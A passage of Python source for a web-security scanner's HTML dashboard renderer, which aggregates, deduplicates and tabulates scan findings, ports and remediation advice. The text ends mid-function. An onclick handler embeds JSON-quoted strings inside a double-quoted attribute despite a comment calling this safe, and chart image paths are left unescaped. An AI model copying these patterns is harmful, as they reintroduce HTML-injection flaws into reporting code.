"""
websecure.reporters.html_dashboard
------------------------------------
HTML dashboard renderer for WebSecure scan results.
Generates a modern, dark-mode, single-file HTML report.
"""
from __future__ import annotations

import json
import logging
import re
from datetime import datetime, timezone


_logger = logging.getLogger(__name__)

def _escape(s):
    if s is None:
        return ""
    return (str(s)
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#39;"))


# ---------------------------------------------------------------------------
# Helper: cap large string values inside finding detail dicts.
# Without this, a single finding with a full 50 KB HTTP response body inflates
# the embedded JS literal to several MB and causes browser parse failures.
# ---------------------------------------------------------------------------
# Severity normalizer: input is always lowercased before lookup
_HTML_SEV_NORM: dict = {
    "critical": "Critical",
    "high":     "High",
    "medium":   "Medium",
    "low":      "Low",
}

_LARGE_DETAIL_KEYS = {
    "response", "raw_response", "body", "html", "content",
    "page_source", "source", "html_content", "page", "text",
    "raw_body", "response_body", "res_body",
    "request_body", "payloads",
}


def _cap_detail(d, max_str: int = 1500, max_large: int = 400):
    """Return a copy of dict *d* with overly-long strings trimmed."""
    if not isinstance(d, dict):
        return d
    out: dict = {}
    for k, v in d.items():
        cap = max_large if k.lower() in _LARGE_DETAIL_KEYS else max_str
        if isinstance(v, str):
            out[k] = v[:cap] + f"…[+{len(v)-cap}]" if len(v) > cap else v
        elif isinstance(v, dict):
            out[k] = _cap_detail(v, max_str, max_large)
        elif isinstance(v, list):
            capped = []
            for item in v[:50]:
                if isinstance(item, dict):
                    capped.append(_cap_detail(item, max_str, max_large))
                elif isinstance(item, str) and len(item) > max_str:
                    capped.append(item[:max_str] + "…")
                else:
                    capped.append(item)
            out[k] = capped
        else:
            out[k] = v
    return out


# ---------------------------------------------------------------------------
# Helper: parse nmap ssl-cert script text into a cert dict.
# Used as fallback when results["tls"]["certificate"] is absent.
# ---------------------------------------------------------------------------
def _parse_nmap_ssl_cert(text: str) -> dict:
    """Parse nmap ssl-cert NSE script output into a cert dict for ssl_html."""
    cert: dict = {}
    for line in text.splitlines():
        line = line.strip()
        lower = line.lower()

        if lower.startswith("subject:"):
            m = re.search(r"commonName\s*=\s*([^/,\n]+)", line, re.I)
            if m:
                cert["subject_CN"] = m.group(1).strip()

        elif lower.startswith("issuer:"):
            m = re.search(r"commonName\s*=\s*([^/,\n]+)", line, re.I)
            if m:
                cert["issuer_CN"] = m.group(1).strip()
            m2 = re.search(r"organizationName\s*=\s*([^/,\n]+)", line, re.I)
            if m2:
                cert["issuer_O"] = m2.group(1).strip()

        elif re.match(r"not valid before\s*:", line, re.I):
            ts = line.split(":", 1)[1].strip()
            cert["not_before"] = ts

        elif re.match(r"not valid after\s*:", line, re.I):
            ts = line.split(":", 1)[1].strip()
            cert["not_after"] = ts
            try:
                exp = datetime.fromisoformat(
                    ts.rstrip("Z").replace(" ", "T").split("+")[0]
                )
                cert["days_remaining"] = (datetime.now().date() - exp.date()).days * -1
            except Exception as _fix_e:
                _logger.debug(f"[reporters.html_dashboard] {type(_fix_e).__name__}: {_fix_e!r}")

        elif lower.startswith("sha-1:") or lower.startswith("sha1:"):
            cert["fingerprint"] = line.split(":", 1)[1].strip()

        elif lower.startswith("sha-256:") or lower.startswith("sha256:"):
            cert.setdefault("fingerprint", line.split(":", 1)[1].strip())

        elif re.match(r"subject alt(ernative)? name", line, re.I):
            san_raw = line.split(":", 1)[1].strip() if ":" in line else ""
            san_list = [
                s.strip().split(":")[-1]
                for s in san_raw.split(",")
                if re.match(r"\s*(DNS|IP)\s*:", s, re.I)
            ]
            if san_list:
                cert["san"] = san_list

    if cert.get("subject_CN") or cert.get("not_after"):
        cert.setdefault("valid", True)
        cert.setdefault(
            "self_signed",
            bool(cert.get("issuer_CN"))
            and cert.get("subject_CN", "").lower() == cert.get("issuer_CN", "").lower(),
        )
    return cert


def render_html_dashboard(results: dict) -> str:
    """
    Generates a modern, dark-mode, single-file HTML dashboard from the scan results.
    """
    # --- Data Prep ---
    meta = results.get("meta") or {}
    if isinstance(meta, list):
         meta = next((x for x in meta if isinstance(x, dict)), {})

    target = meta.get("target") or "Unknown Target"
    scan_date = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    # Flatten findings for the table
    findings = []

    # Use 'final' bucket if non-empty (matches MD report source), otherwise aggregate all buckets.
    # This keeps MD and HTML counts consistent.
    _final_items = results.get("final")
    _use_final_only = isinstance(_final_items, list) and len(_final_items) > 0

    all_buckets = (
        ["final"] if _use_final_only else [
            "final", "offensive", "xss", "csrf", "jwt", "sqli", "nosqli",
            "ssrf", "xxe", "graphql", "file_upload", "auth", "auth_matrix",
            "headers", "security_headers", "rate_limit", "request_smuggling",
            "session_scanner", "mass_assignment", "ws_fuzz", "infrastructure",
            "sqlmap", "feroxbuster", "ffuf", "nuclei", "owasp",
            "discovery", "passive", "subdomains", "vulnerability",
            "portscan", "nmap", "tls", "tls_findings", "js_analysis", "files_discovered",
            "httpx", "http_probe", "katana", "crawl", "dalfox", "amass", "subfinder",
            "interactsh", "oast",
            "clickjacking", "param_pollution", "bypass_403", "business_logic",
            "oauth2", "cache_poisoning", "host_header",
        ]
    )

    _id_counter = 1

    for bucket in all_buckets:
        items = results.get(bucket)
        if not items:
            continue

        if isinstance(items, dict):
            items = [items] # Normalize single dict to list

        if not isinstance(items, list):
            continue

        for item in items:
            if not isinstance(item, dict): continue

            # Build meaningful type label
            if bucket == "nmap" and item.get("port"):
                _svc = item.get("service") or item.get("name") or "?"
                _prod = item.get("product") or ""
                f_type = f"Open Port {item['port']}/{item.get('proto','tcp')} ({_svc}{' '+_prod if _prod else ''})"
            elif bucket == "portscan" and not item.get("type"):
                f_type = item.get("message") or "Port Scan Note"
            else:
                f_type = item.get("type") or item.get("title") or item.get("message") or "Generic"
            _raw_sev = (item.get("severity") or "Info").lower()
            f_sev = _HTML_SEV_NORM.get(_raw_sev, "Info")

            # Skip status/meta-only items
            if bucket == "sqlmap" and item.get("status") in ("skipped", "finished") and "findings" in item:
                continue
            if bucket == "feroxbuster" and item.get("status") in ("skipped", "finished"):
                continue
            if bucket == "nuclei" and item.get("status") in ("skipped", "completed"):
                continue
            # phase_error items get their own section below, not the findings table
            if bucket == "phase_error":
                continue
            # Skip subdomains items that are plain strings (not finding dicts)
            if bucket == "subdomains" and not item.get("type") and not item.get("severity"):
                continue
            # Nmap/portscan port records have their own dedicated section — skip from main findings table
            # (they'd appear with IP-only URL and Info severity, polluting the table)
            if bucket in ("nmap", "port_scan", "portscan", "ports") and item.get("port"):
                continue
            # HTTP probe results have their own section — only include if they have a vuln type
            if bucket in ("httpx", "http_probe") and not item.get("type"):
                continue
            # Katana crawl endpoints are informational — skip unless they carry a finding type
            if bucket in ("katana", "crawl") and not item.get("type"):
                continue

            # Resolve URL — prefer clean URL, fall back to target, avoid bare IPs
            _raw_url = item.get("url") or item.get("target") or item.get("host") or ""
            # Normalize: if it looks like a bare IP or hostname (no scheme), add http://
            if _raw_url and "://" not in _raw_url and not _raw_url.startswith("-"):
                _raw_url = "http://" + _raw_url
            f_url = _raw_url or "-"

            f = {
                "id": _id_counter,
                "severity": f_sev,
                "type": f"{f_type} ({bucket})", # Show tool source
                "url": f_url,
                "method": item.get("method") or "GET",
                "param": item.get("param") or item.get("parameter") or "-",
                "status": "Open",
                "detail": item
            }
            findings.append(f)
            _id_counter += 1

    # Deduplicate findings by (base_type, url, param) — same logic as reporting._dedupe_findings
    # This keeps the highest-severity version when multiple buckets report the same finding.
    _sev_ranks = {"Critical": 4, "High": 3, "Medium": 2, "Low": 1, "Info": 0}
    _dedup_map: dict = {}
    for _f in findings:
        _base = _f["type"].split(" (")[0].strip()
        _key = (_base, _f["url"], _f["param"])
        _ex = _dedup_map.get(_key)
        if _ex is None:
            _dedup_map[_key] = _f
        elif _sev_ranks.get(_f["severity"], 0) > _sev_ranks.get(_ex["severity"], 0):
            _f2 = dict(_f)
            _f2["id"] = _ex["id"]
            _dedup_map[_key] = _f2
    findings = list(_dedup_map.values())
    for _idx, _f in enumerate(findings, 1):
        _f["id"] = _idx

    # Calculate Summary Stats
    stats = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
    for f in findings:
        sev = f["severity"]
        if sev in stats:
            stats[sev] += 1
        else:
            stats["Info"] += 1

    total_issues = sum(stats.values())

    # Discovery Info (IP)
    # "discovery" bucket is a list of finding dicts; DNS info lives in meta or dedicated keys
    _disc_raw = results.get("discovery")
    if isinstance(_disc_raw, dict):
        _disc_dict = _disc_raw
    elif isinstance(_disc_raw, list):
        # Try to find a dict entry that carries dns/ip info
        _disc_dict = next(
            (x for x in _disc_raw if isinstance(x, dict) and ("dns" in x or "ip" in x)),
            {}
        )
    else:
        _disc_dict = {}
    dns = _disc_dict.get("dns") or {}
    if isinstance(dns, list):
        dns = next((x for x in dns if isinstance(x, dict)), {})
    # Fallback: look for ip directly in meta or top-level results
    target_ip = (
        dns.get("ip")
        or (meta.get("ip") if isinstance(meta, dict) else None)
        or results.get("target_ip")
        or "N/A"
    )

    # Charts logic (images)
    charts_html = ""
    charts = results.get("charts") or []
    if charts:
        charts_html += '<div class="gallery">'
        for ch in charts:
            path = ch.get("rel_path") or ch.get("path")
            title = ch.get("title")
            if path:
                # If path is local, we might want to inline it or just link it.
                # For now, linking assuming relative path structure (output/report.html -> output/images/...)
                # But to be safe, if 'images/' is in path, use it.
                if "images" in path and not path.startswith("http"):
                    # fix path separator for web
                    path = path.replace("\\", "/")
                    if "images/" in path:
                         path = "images/" + path.split("images/")[-1]

                charts_html += f'''
                <div class="card chart-card">
                    <h3>{_escape(title)}</h3>
                    <img src="{path}" alt="{_escape(title)}" onerror="this.style.display='none'">
                </div>
                '''
        charts_html += '</div>'

    # --- JS Analysis Data Prep ---
    js_files_html = ""
    js_items = results.get("js_analysis") or []
    if isinstance(js_items, list) and js_items:
        js_files = [f for f in js_items if isinstance(f, dict) and f.get("type") == "JS File Discovered"]
        js_endpoints = [f for f in js_items if isinstance(f, dict) and f.get("type") == "JS Endpoint Discovered"]
        js_secrets = [f for f in js_items if isinstance(f, dict) and "Secret" in (f.get("type") or "")]

        rows_files = "".join(
            f"<tr><td class='url'><a href='{_escape(f.get('url',''))}' target='_blank' style='color:var(--accent)'>{_escape(f.get('url',''))}</a></td>"
            f"<td>{_escape(f.get('detail',''))}</td></tr>"
            for f in js_files
        )
        rows_endpoints = "".join(
            f"<tr><td style='font-family:monospace; color:var(--sev-low)'>{_escape(f.get('parameter',''))}</td>"
            f"<td class='url' style='font-size:0.85rem'>{_escape(f.get('url',''))}</td></tr>"
            for f in js_endpoints[:50]  # cap at 50 for readability
        )
        rows_secrets = "".join(
            f"<tr>"
            f"<td><span class='tag High'>High</span></td>"
            f"<td><strong>{_escape(f.get('type',''))}</strong></td>"
            f"<td class='url'>{_escape(f.get('url',''))}</td>"
            f"<td style='font-family:monospace; font-size:0.85rem; color:var(--sev-high)'>{_escape(f.get('detail',''))}</td>"
            f"</tr>"
            for f in js_secrets
        )

        secret_warning = f"<div style='background:rgba(218,54,51,0.1); border:1px solid var(--sev-critical); border-radius:4px; padding:0.75rem; margin-bottom:1rem; color:var(--sev-critical); font-weight:600;'>[!] {len(js_secrets)} hardcoded secret(s) detected in JavaScript files!</div>" if js_secrets else ""

        js_files_html = f"""
        <div class="card" style="background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
            <h3 style="margin-top:0;">[scroll] JavaScript File Analysis</h3>
            {secret_warning}
            <div style="display:grid; grid-template-columns:repeat(3,1fr); gap:1rem; margin-bottom:1.5rem;">
                <div class="stat-card" style="padding:1rem; text-align:center;">
                    <span class="stat-value" style="font-size:1.5rem; color:var(--accent)">{len(js_files)}</span>
                    <span class="stat-label">JS Files Found</span>
                </div>
                <div class="stat-card" style="padding:1rem; text-align:center;">
                    <span class="stat-value" style="font-size:1.5rem; color:var(--sev-low)">{len(js_endpoints)}</span>
                    <span class="stat-label">Endpoints Extracted</span>
                </div>
                <div class="stat-card" style="padding:1rem; text-align:center;">
                    <span class="stat-value" style="font-size:1.5rem; color:var(--sev-high)">{len(js_secrets)}</span>
                    <span class="stat-label">Secrets Detected</span>
                </div>
            </div>
            {"<h4>JS Files</h4><div class='table-container'><table><thead><tr><th>URL</th><th>Info</th></tr></thead><tbody>" + rows_files + "</tbody></table></div>" if rows_files else ""}
            {"<h4 style='margin-top:1rem;'>Hidden Endpoints / API Paths</h4><div class='table-container'><table><thead><tr><th>Path</th><th>Found In</th></tr></thead><tbody>" + rows_endpoints + "</tbody></table></div>" if rows_endpoints else ""}
            {"<h4 style='margin-top:1rem; color:var(--sev-high);'>[!] Hardcoded Secrets</h4><div class='table-container'><table><thead><tr><th>Severity</th><th>Type</th><th>File</th><th>Detail</th></tr></thead><tbody>" + rows_secrets + "</tbody></table></div>" if rows_secrets else ""}
        </div>
        """

    # --- httpx Probe Results ---
    httpx_html = ""
    httpx_items = results.get("httpx") or results.get("http_probe") or []
    if isinstance(httpx_items, list) and httpx_items:
        _hx_rows = []
        for _hx in httpx_items:
            if not isinstance(_hx, dict):
                continue
            _hx_url = _hx.get("url") or _hx.get("input") or "-"
            _hx_sc  = _hx.get("status_code") or _hx.get("status") or "-"
            _hx_title = _hx.get("title") or _hx.get("webserver") or "-"
            _hx_tech = ", ".join(_hx.get("tech") or _hx.get("technologies") or []) or "-"
            _hx_clen = _hx.get("content_length") or _hx.get("content-length") or "-"
            _sc_color = "var(--sev-low)" if str(_hx_sc).startswith("2") else (
                "var(--sev-medium)" if str(_hx_sc).startswith("3") else (
                "var(--sev-high)" if str(_hx_sc).startswith("4") else (
                "var(--sev-critical)" if str(_hx_sc).startswith("5") else "var(--text-muted)")))
            _hx_rows.append(
                f"<tr>"
                f"<td class='url'><a href='{_escape(_hx_url)}' target='_blank' style='color:var(--accent)'>{_escape(_hx_url)}</a></td>"
                f"<td><span style='font-weight:600; color:{_sc_color}'>{_escape(str(_hx_sc))}</span></td>"
                f"<td style='font-size:0.88rem'>{_escape(_hx_title)}</td>"
                f"<td style='font-size:0.83rem; color:var(--sev-low)'>{_escape(_hx_tech)}</td>"
                f"<td style='font-family:monospace; font-size:0.83rem'>{_escape(str(_hx_clen))}</td>"
                f"</tr>"
            )
        if _hx_rows:
            httpx_html = f"""
            <div class="card" style="background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
                <h3 style="margin-top:0;">[signal] HTTP Probe Results — httpx ({len(_hx_rows)} hosts)</h3>
                <div class="table-container">
                    <table>
                        <thead><tr><th>URL</th><th>Status</th><th>Title / Server</th><th>Technologies</th><th>Content-Length</th></tr></thead>
                        <tbody>{''.join(_hx_rows)}</tbody>
                    </table>
                </div>
            </div>
            """

    # --- katana Crawl Results ---
    katana_html = ""
    katana_items = results.get("katana") or results.get("crawl") or results.get("endpoints") or []
    if isinstance(katana_items, list) and katana_items:
        # Filter to show only endpoint strings or dicts
        _kat_eps = []
        for _ke in katana_items:
            if isinstance(_ke, str) and "://" in _ke:
                _kat_eps.append({"url": _ke, "method": "GET", "source": "crawl"})
            elif isinstance(_ke, dict) and _ke.get("url"):
                _kat_eps.append(_ke)
        if _kat_eps:
            _kat_rows = "".join(
                f"<tr>"
                f"<td class='url' style='font-size:0.85rem'>"
                f"  <a href='{_escape(ep.get('url',''))}' target='_blank' style='color:var(--accent)'>{_escape(ep.get('url',''))}</a>"
                f"</td>"
                f"<td style='font-family:monospace; font-size:0.83rem; color:var(--text-muted)'>{_escape(ep.get('method','GET'))}</td>"
                f"<td style='font-size:0.83rem; color:var(--text-muted)'>{_escape(ep.get('source','') or ep.get('tag',''))}</td>"
                f"</tr>"
                for ep in _kat_eps[:200]  # cap at 200 for readability
            )
            katana_html = f"""
            <div class="card" style="background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
                <h3 style="margin-top:0;">[globe] Crawled Endpoints — katana ({len(_kat_eps)} found{', showing 200' if len(_kat_eps) > 200 else ''})</h3>
                <div class="table-container">
                    <table>
                        <thead><tr><th>URL</th><th>Method</th><th>Source</th></tr></thead>
                        <tbody>{_kat_rows}</tbody>
                    </table>
                </div>
            </div>
            """

    # --- Discovered Files Data Prep ---
    files_html = ""
    file_items = results.get("files_discovered") or []
    if isinstance(file_items, list) and file_items:
        sensitive_files = [f for f in file_items if isinstance(f, dict) and f.get("severity") not in ("Info", None, "")]
        all_file_rows = "".join(
            f"<tr>"
            f"<td><span class='tag {_escape(f.get('severity','Info'))}'>{_escape(f.get('severity','Info'))}</span></td>"
            f"<td class='url'><a href='{_escape(f.get('url',''))}' target='_blank' style='color:var(--accent)'>{_escape(f.get('url',''))}</a></td>"
            f"<td style='font-size:0.85rem'>{_escape(f.get('type') or f.get('detail',''))}</td>"
            f"</tr>"
            for f in file_items if isinstance(f, dict) and f.get("url")
        )
        if all_file_rows:
            sen_warn = f"<div style='background:rgba(218,54,51,0.1); border:1px solid var(--sev-critical); border-radius:4px; padding:0.75rem; margin-bottom:1rem; color:var(--sev-critical); font-weight:600;'>[!] {len(sensitive_files)} sensitive file(s) exposed!</div>" if sensitive_files else ""
            files_html = f"""
            <div class="card" style="background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
                <h3 style="margin-top:0;">[dir] Discovered Files ({len(file_items)} total, {len(sensitive_files)} sensitive)</h3>
                {sen_warn}
                <div class="table-container">
                    <table>
                        <thead><tr><th>Severity</th><th>URL</th><th>Type / Detail</th></tr></thead>
                        <tbody>{all_file_rows}</tbody>
                    </table>
                </div>
            </div>
            """

    # --- Remediation Priority Matrix ---
    _REMEDIATION_DB = {
        "sql injection": ("Parameterized queries / prepared statements", "Low"),
        "sqli": ("Parameterized queries / prepared statements", "Low"),
        "ssti": ("Disable user-controlled template evaluation; use static templates", "Medium"),
        "template injection": ("Disable user-controlled template evaluation; use static templates", "Medium"),
        "command injection": ("Avoid shell calls; use subprocess list args instead of shell=True", "Low"),
        "cmdi": ("Avoid shell calls; use subprocess list args instead of shell=True", "Low"),
        "xss": ("Output-encode all user data; set strict CSP header", "Medium"),
        "cross-site scripting": ("Output-encode all user data; set strict CSP header", "Medium"),
        "ssrf": ("Allowlist outbound destinations; block access to internal metadata endpoints", "Medium"),
        "xxe": ("Disable external entity processing in XML parser config", "Low"),
        "jwt": ("Use RS256/ES256; validate aud/iss/exp; rotate signing keys", "Medium"),
        "idor": ("Enforce server-side authorization on every resource access", "Medium"),
        "csrf": ("SameSite=Strict cookies + CSRF tokens on all state-changing requests", "Low"),
        "open redirect": ("Allowlist redirect destinations; reject arbitrary user-supplied URLs", "Low"),
        "security header": ("Set HSTS, X-Content-Type-Options, X-Frame-Options, CSP", "Low"),
        "prototype pollution": ("Freeze Object.prototype; use null-prototype objects for merge targets", "Medium"),
        "file upload": ("Validate MIME type server-side; store outside web root; rename files", "Medium"),
        "mass assignment": ("Use explicit allow-lists for assignable fields; reject extra params", "Low"),
        "nosql": ("Use typed query builders; never interpolate user input into query strings", "Low"),
        "graphql": ("Disable introspection in production; enforce query depth/cost limits", "Low"),
        "request smuggling": ("Normalize HTTP/1.1 headers; use HTTP/2 end-to-end where possible", "High"),
        "race condition": ("Use atomic operations / advisory locks around critical sections", "High"),
        "tls": ("Upgrade to TLS 1.2+; disable SSLv3/TLS 1.0; renew expiring certificates", "Low"),
        "certificate": ("Renew certificate; use a trusted CA; enable HSTS preloading", "Low"),
    }
    _SEV_ORDER = {"Critical": 4, "High": 3, "Medium": 2, "Low": 1, "Info": 0}
    _EFFORT_COLOR = {"Low": "var(--sev-low)", "Medium": "var(--sev-medium)", "High": "var(--sev-high)"}

    # Build type -> {max_sev, count, advice, effort}
    type_map = {}
    for f in findings:
        raw_type = f["type"].split(" (")[0] if " (" in f["type"] else f["type"]
        entry = type_map.setdefault(raw_type, {"count": 0, "max_sev": 0, "sev_label": "Info"})
        entry["count"] += 1
        sev_rank = _SEV_ORDER.get(f["severity"], 0)
        if sev_rank > entry["max_sev"]:
            entry["max_sev"] = sev_rank
            entry["sev_label"] = f["severity"]
        # Lookup advice
        if "advice" not in entry:
            key_lower = raw_type.lower()
            for kw, (adv, eff) in _REMEDIATION_DB.items():
                if kw in key_lower:
                    entry["advice"] = adv
                    entry["effort"] = eff
                    break
        entry.setdefault("advice", "Review and remediate per OWASP guidance")
        entry.setdefault("effort", "Medium")

    priority_rows = sorted(type_map.items(), key=lambda x: (-x[1]["max_sev"], -x[1]["count"]))

    _rem_rows_html = ""
    for rank, (vtype, info) in enumerate(priority_rows[:20], 1):
        sev_lbl = info["sev_label"]
        effort  = info["effort"]
        ec      = _EFFORT_COLOR.get(effort, "var(--text-muted)")
        # Safe JS string: use JSON encoding to avoid quote/special-char issues
        vtype_js = json.dumps(vtype)  # produces "\"...\""  — safe inside onclick attr
        sev_js   = json.dumps(sev_lbl)
        _rem_rows_html += (
            f"<tr>"
            f"<td style='text-align:center; color:var(--text-muted); font-weight:600'>{rank}</td>"
            f"<td style='font-weight:500; cursor:pointer;' "
            f"    onclick=\"filterByType({vtype_js})\" "
            f"    title='Click to filter findings by type: {_escape(vtype)}'>"
            f"  {_escape(vtype)} <span style='font-size:0.75rem; color:var(--accent);'>&#9660;</span>"
            f"</td>"
            f"<td style='cursor:pointer;' "
            f"    onclick=\"filterBySeverity({sev_js})\" "
            f"    title='Click to filter by severity: {_escape(sev_lbl)}'>"
            f"  <span class='tag {_escape(sev_lbl)}'>{_escape(sev_lbl)} &#9660;</span>"
            f"</td>"
            f"<td style='text-align:center; color:var(--accent); font-weight:600'>{info['count']}</td>"
            f"<td style='font-size:0.88rem; color:var(--text-muted)'>{_escape(info['advice'])}</td>"
            f"<td style='font-weight:600; color:{ec}'>{_escape(effort)}</td>"
            f"</tr>"
        )

    remediation_html = ""
    if _rem_rows_html:
        remediation_html = f"""
        <div class="card" style="background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
            <h3 style="margin-top:0;">[target] Remediation Priority Matrix</h3>
            <p style="color:var(--text-muted); font-size:0.88rem; margin:0 0 1rem;">Ordered by severity and frequency. Fix Critical/High items first.</p>
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th width="40">#</th>
                            <th>Vulnerability Type</th>
                            <th width="100">Max Severity</th>
                            <th width="60">Count</th>
                            <th>Recommended Fix</th>
                            <th width="110">Fix Effort</th>
                        </tr>
                    </thead>
                    <tbody>{_rem_rows_html}</tbody>
                </table>
            </div>
        </div>
        """

    # Serialize findings for JS
    # -------------------------------------------------------------------
    # Cap large string values inside each finding's "detail" dict BEFORE
    # JSON serialisation.  Raw HTTP response bodies can easily be 50-200 KB
    # each; with hundreds of findings that pushes the inline <script> block
    # past 2 MB, which causes the browser JS engine to silently fail while
    # parsing the literal → data stays [] → table renders empty → clicks
    # do nothing.
    # -------------------------------------------------------------------
    _ser_findings = [
        {**_f, "detail": _cap_detail(_f.get("detail") or {})}
        for _f in findings
    ]
    try:
        findings_json = (
            json.dumps(_ser_findings, default=str)
            .replace("<", "\\u003c")
            .replace(">", "\\u003e")
        )
    except Exception as _jdump_exc:
        _logger.warning("[html_dashboard] findings JSON serialization failed: %r — using empty list", _jdump_exc)
        findings_json = "[]"
    # Hard safety cap: if still > 2 MB, strip detail entirely
    if len(findings_json) > 2_000_000:
        _logger.warning(
            "[html_dashboard] Findings JSON exceeds 2 MB (%d KB) — stripping detail fields for inline report",
            len(findings_json) // 1024,
        )
        try:
            _ser_findings_min = [
                {**_f, "detail": {"message": "Detail omitted — payload too large for inline report."}}
                for _f in findings
            ]
            findings_json = (
                json.dumps(_ser_findings_min, default=str)
                .replace("<", "\\u003c")
                .replace(">", "\\u003e")
            )
        except Exception as _jdump2_exc:
            _logger.warning("[html_dashboard] findings JSON fallback serialization failed: %r", _jdump2_exc)
            findings_json = "[]"
    _data_size_kb = len(findings_json) // 1024

    # --- Ports Data Prep ---
    ports_html = ""
    nmap_data = results.get("nmap") or results.get("port_scan") or results.get("ports") or []
    # Try bucket results directly
    if not nmap_data:
        _bkt_nmap = results.get("_buckets", {}).get("nmap") or []
        if isinstance(_bkt_nmap, list):
            nmap_data = _bkt_nmap
    # Fallback: extract port records from findings we already collected via all_buckets
    if not nmap_data:
        nmap_data = [
            f["detail"] for f in findings
            if isinstance(f.get("detail"), dict)
            and f["detail"].get("port")
            and ("(nmap)" in f.get("type", "") or "(portscan)" in f.get("type", ""))
        ]
    # Normalize: ensure every item is a dict with expected keys
    _nmap_norm = []
    for _nd in nmap_data:
        if not isinstance(_nd, dict):
            continue
        # Items might have "ip" but not "host"
        if not _nd.get("host"):
            _nd = dict(_nd)
            _nd["host"] = _nd.get("ip") or _nd.get("hostname") or "-"
        # Items might have "protocol" but not "proto"
        if not _nd.get("proto"):
            _nd = dict(_nd)
            _nd["proto"] = _nd.get("protocol") or "tcp"
        _nmap_norm.append(_nd)
    nmap_data = _nmap_norm

    nmap_ran = bool(nmap_data) or bool(results.get("port_scan_summary")) or bool(results.get("open_ports"))

    if isinstance(nmap_data, list):
        rows = []
        for p in nmap_data:
             if not isinstance(p, dict): continue
             # Normalize fields
             host = p.get("host") or p.get("ip") or p.get("hostname") or "-"
             port = p.get("port") or p.get("dst_port") or "-"
             proto = p.get("proto") or p.get("protocol") or "tcp"
             service = p.get("service") or p.get("name") or "-"
             product = p.get("product") or ""
             version = p.get("version") or ""
             svc_label = f"{service}{' '+product if product else ''}{' '+version if version else ''}".strip()
             state = p.get("state") or "open"

             if "open" in str(state).lower():
                 # Build collapsible details from NSE scripts
                 _scripts = p.get("scripts") or {}
                 _detail_parts = []

                 if "ssl-cert" in _scripts:
                     _cert_lines = [l.strip() for l in _scripts["ssl-cert"].split("\n")
                                    if any(k in l for k in ("commonName", "Not valid", "Subject:", "Issuer:", "Public Key"))]
                     if _cert_lines:
                         _detail_parts.append("<b>SSL Cert:</b><br>" + "<br>".join(_escape(l) for l in _cert_lines[:6]))

                 if "ssl-enum-ciphers" in _scripts:
                     _ct = _scripts["ssl-enum-ciphers"]
                     _ls = next((l.strip() for l in _ct.split("\n") if "least strength" in l.lower()), "")
                     _tv = next((l.strip() for l in _ct.split("\n") if "TLSv" in l or "SSLv" in l), "")
                     _cipher_summary = " | ".join(x for x in [_tv, _ls] if x)
                     if _cipher_summary:
                         _detail_parts.append(f"<b>TLS:</b> {_escape(_cipher_summary)}")

                 if "http-title" in _scripts:
                     _detail_parts.append(f"<b>Title:</b> {_escape(_scripts['http-title'][:80])}")

                 if "http-server-header" in _scripts:
                     _detail_parts.append(f"<b>Server:</b> {_escape(_scripts['http-server-header'][:80])}")

                 for _sid in ("ssl-heartbleed", "ssl-poodle", "ssl-ccs-injection"):
                     if _sid in _scripts and "VULNERABLE" in _scripts[_sid].upper():
                         _detail_parts.append(f"<b style='color:var(--sev-critical)'>VULN: {_escape(_sid)}</b>")

                 _details_html = ""
                 if _detail_parts:
                     _inner = "<br><br>".join(_detail_parts)
                     _details_html = (
                         f"<details style='cursor:pointer'>"
                         f"<summary style='color:var(--accent);font-size:0.8rem;list-style:none'>&#9656; details</summary>"
                         f"<div style='font-size:0.78rem;margin-top:6px;line-height:1.6;color:var(--text-muted)'>{_inner}</div>"
                         f"</details>"
                     )

                 rows.append(
                     f"<tr>"
                     f"<td style='font-family:monospace'>{_escape(host)}</td>"
                     f"<td style='font-weight:600; color:var(--accent)'>{port}</td>"
                     f"<td><span style='font-size:0.8rem; color:var(--text-muted)'>{_escape(proto)}</span></td>"
                     f"<td>{_escape(svc_label)}</td>"
                     f"<td><span class='tag Low'>{_escape(state)}</span></td>"
                     f"<td style='max-width:320px'>{_details_html}</td>"
                     f"</tr>"
                 )

        if rows:
             ports_html = f"""
             <div class="card" style="background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
                <h3 style="margin-top:0;">[web] Open Ports — Nmap ({len(rows)} found)</h3>
                <div class="table-container">
                    <table>
                        <thead><tr><th>Host</th><th>Port</th><th>Proto</th><th>Service</th><th>State</th><th>Details</th></tr></thead>
                        <tbody>{''.join(rows)}</tbody>
                    </table>
                </div>
             </div>
             """
        else:
             # Nmap ran but found no open ports — show the section with a notice
             _no_ports_msg = "Nmap taraması tamamlandı — açık port bulunamadı." if nmap_ran else "Nmap taraması çalıştırılmadı veya veri bulunamadı."
             ports_html = f"""
             <div class="card" style="background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
                <h3 style="margin-top:0;">[web] Port Taraması — Nmap</h3>
                <p style="color:var(--text-muted); font-size:0.9rem; margin:0;">
                    <span style="color:var(--sev-low)">&#9632;</span> {_escape(_no_ports_msg)}
                </p>
             </div>
             """

    # --- WAF Detection Status ---
    waf_raw = results.get("waf_detection") or {}
    if isinstance(waf_raw, list):
        waf_raw = next((x for x in waf_raw if isinstance(x, dict)), {})
    waf_detected = bool(waf_raw.get("detected"))
    waf_vendor = waf_raw.get("vendor") or "None"
    waf_confidence = waf_raw.get("confidence") or 0.0
    waf_badge_color = "var(--sev-critical)" if waf_detected else "var(--sev-low)"
    waf_label = f"{_escape(waf_vendor)} ({int(float(waf_confidence)*100)}%)" if waf_detected else "Not Detected"

    # --- Metrics / Traffic Data ---
    _metrics_raw = results.get("metrics") or {}
    if isinstance(_metrics_raw, list):
        metrics = next((x for x in _metrics_raw if isinstance(x, dict)), {})
    elif isinstance(_metrics_raw, dict):
        metrics = _metrics_raw
    else:
        metrics = {}
    _counters_raw = metrics.get("counters") or {}
    if isinstance(_counters_raw, list):
